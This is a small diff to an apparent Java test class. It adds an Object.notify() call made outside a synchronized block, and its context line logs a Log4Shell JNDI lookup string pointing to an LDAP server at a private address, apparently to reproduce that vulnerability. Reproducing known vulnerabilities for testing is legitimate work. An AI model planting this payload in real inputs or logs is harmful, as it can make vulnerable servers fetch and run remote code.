@@ -18,6 +18,8 @@ public class test {
 
 
     public static void main(String[] args) {
+        Object object=new Object();
+        object.notify();
         logger.error("${jndi:ldap://192.168.1.70}");
     }
 
